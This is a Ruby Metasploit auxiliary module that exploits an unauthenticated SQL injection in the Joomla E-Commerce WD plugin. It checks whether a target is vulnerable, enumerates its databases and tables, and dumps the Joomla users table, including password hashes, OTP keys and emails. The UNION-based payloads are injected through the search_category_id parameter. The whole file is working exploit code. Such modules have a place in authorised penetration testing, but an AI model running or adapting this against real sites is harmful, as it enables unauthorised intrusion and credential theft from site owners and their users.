##
## This module requires Metasploit: http//metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Joomla E-Commerce WD Plugin Users Enumeration via SQL injection",
      'Description'    => %q{
      This module attempts to exploit an unauthenticated SQL injection in order to 
      enumerate the Joomla users table.
      },
      'License'        => 'VolatileMinds',
      'Author'         =>
        [
          'Brandon Perry'
        ],
      'References'     =>
        [
          ['URL', 'http://www.exploit-db.com/exploits/35224/']
        ],
      'Platform'       => ['linux'],
      'Privileged'     => false,
      'DisclosureDate' => "Nov 13 2014"))

      register_options(
      [
        OptString.new('TARGETURI', [ true, 'Relative URI of Joomla installation', '/'])
      ], self.class)
  end

  def check

    left_marker = Rex::Text.rand_text_alpha(5)
    right_marker = Rex::Text.rand_text_alpha(5)

    sql = "UNION ALL SELECT CONCAT(0x#{left_marker.unpack("H*")[0]},(CASE WHEN (QUARTER(NULL) IS NULL) THEN 1 ELSE 0 END),0x#{right_marker.unpack("H*")[0]})-- "

    res = send_injected_request(sql)

    unless res
      fail_with(Failure::Unknown, "Server did not respond in an expected way")
    end

    code = res.body =~ /#{left_marker}1#{right_marker}/ ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Safe
    return code
  end

  def run
    unless check == Exploit::CheckCode::Vulnerable
      fail_with(Failure::Config, "Target not exploitable")
    end

    dbs = get_dbs

    dbs.delete('mysql')
    dbs.delete('performance_schema')
    dbs.delete('information_schema')

    users = []
    dbs.each do |db|
      tables = get_tables(db)

      users_table = ''
      tables.each do |table|
        users_table = table if table =~ /_users$/
      end

      get_users(db, users_table).each do |user|
        users << user
      end
    end

    path = store_loot("joomlafile", "application/json", datastore['RHOST'], users.to_json, 'joomla_ecommercewd.users')

    print_good("Users stored in file: " + path)
  end

  def get_dbs
    left_marker = Rex::Text.rand_text_alpha(5)
    right_marker = Rex::Text.rand_text_alpha(5)

    count = "UNION ALL SELECT CONCAT(0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]}) FROM INFORMATION_SCHEMA.SCHEMATA-- "

    res = send_injected_request(count)

    count = $1 if res.body =~ /#{left_marker}(.*)#{right_marker}/

    unless count
      fail_with(Failure::Unknown, "Server did not respond in an expectd way")
    end

    dbs = []
    0.upto(count.to_i-1) do |i|
      db = "UNION ALL SELECT (SELECT CONCAT(0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(schema_name AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]}) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT #{i},1)-- "

      res = send_injected_request(db)

      dbs << $1 if res.body =~ /#{left_marker}(.*)#{right_marker}/
    end

    return dbs
  end

  def get_tables(db)
    left_marker = Rex::Text.rand_text_alpha(5)
    right_marker = Rex::Text.rand_text_alpha(5)

    count = "UNION ALL SELECT CONCAT(0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(COUNT(table_name) AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]}) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x#{db.unpack("H*")[0]})-- "

    res = send_injected_request(count)

    count = $1 if res.body =~ /#{left_marker}(.*)#{right_marker}/

    unless count
      fail_with(Failure::Unknown, "Server did not respond in an expected way")
    end

    tables = []
    0.upto(count.to_i-1) do |i|
      table = "UNION ALL SELECT (SELECT CONCAT(0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(table_name AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]}) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x#{db.unpack("H*")[0]}) LIMIT #{i},1)-- "
      res = send_injected_request(table)
      tables << $1 if res.body =~ /#{left_marker}(.*)#{right_marker}/
    end

    return tables
  end

  def get_users(db, table)
    left_marker = Rex::Text.rand_text_alpha(5)
    right_marker = Rex::Text.rand_text_alpha(5)
    front_marker = Rex::Text.rand_text_alpha(5)

    count = "UNION ALL SELECT CONCAT(0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(COUNT(*) AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]}) FROM #{db}.#{table}-- "

    res = send_injected_request(count)

    count = $1 if res.body =~ /#{left_marker}(.*)#{right_marker}/

    users = []
    0.upto(count.to_i-1) do |i|
      user = "UNION ALL SELECT (SELECT CONCAT(0x#{front_marker.unpack("H*")[0]},IFNULL(CAST(activation AS CHAR),0x20),0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(block AS CHAR),0x20),0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(email AS CHAR),0x20),0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(id AS CHAR),0x20),0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(lastResetTime AS CHAR),0x20),0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(lastvisitDate AS CHAR),0x20),0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(name AS CHAR),0x20),0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(otep AS CHAR),0x20),0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(otpKey AS CHAR),0x20),0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(params AS CHAR),0x20),0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(password AS CHAR),0x20),0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(registerDate AS CHAR),0x20),0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(requireReset AS CHAR),0x20),0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(resetCount AS CHAR),0x20),0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(sendEmail AS CHAR),0x20),0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(username AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]}) FROM #{db}.#{table} LIMIT #{i},1)-- "
      res = send_injected_request(user)
      regex = /#{front_marker}(.*?)#{left_marker}(.*?)#{left_marker}(.*?)#{left_marker}(.*?)#{left_marker}(.*?)#{left_marker}(.*?)#{left_marker}(.*?)#{left_marker}(.*?)#{left_marker}(.*?)#{left_marker}(.*?)#{left_marker}(.*?)#{left_marker}(.*?)#{left_marker}(.*?)#{left_marker}(.*?)#{left_marker}(.*?)#{left_marker}(.*?)#{right_marker}/
      res.headers['Status'] =~ regex

      users << {
        'activation' => $1,
        'block' => $2,
        'email' => $3,
        'id' => $4,
        'lastResetTime' => $5,
        'lastvisitDate' => $6,
        'name' => $7,
        'otep' => $8,
        'otpKey' => $9,
        'params' => $10,
        'password' => $11,
        'registerDate' => $12,
        'requireReset' => $13,
        'resetCount' => $14,
        'sendEmail' => $15,
        'username' => $16
      }
    end

    return users
  end

  def send_injected_request(str)
    get = {
      'option' => 'com_ecommercewd',
      'controller' => 'products',
      'task' => 'displayproducts'
    }

    post = {
      'product_id' => '',
      'product_count' => '',
      'product_parameters_json' => '',
      'search_name' => '',
      'search_category_id' => '-1) ' + str,
      'filter_filters_opened' => '1',
      'filter_manufacturer_ids' => '1',
      'filter_price_from' => '',
      'filter_price_to' => '',
      'filter_date_added_range' => '0',
      'filter_minimum_rating' => '3',
      'filter_tags' => '',
      'arrangement' => 'thumbs',
      'sort_by' => '',
      'sort_order' => 'asc',
      'paginition_limit_start' => '0',
      'paginiation_limit' => '12'
    }

    return send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'method' => 'POST',
      'vars_get' => get,
      'vars_post' => post
    })
  end
end

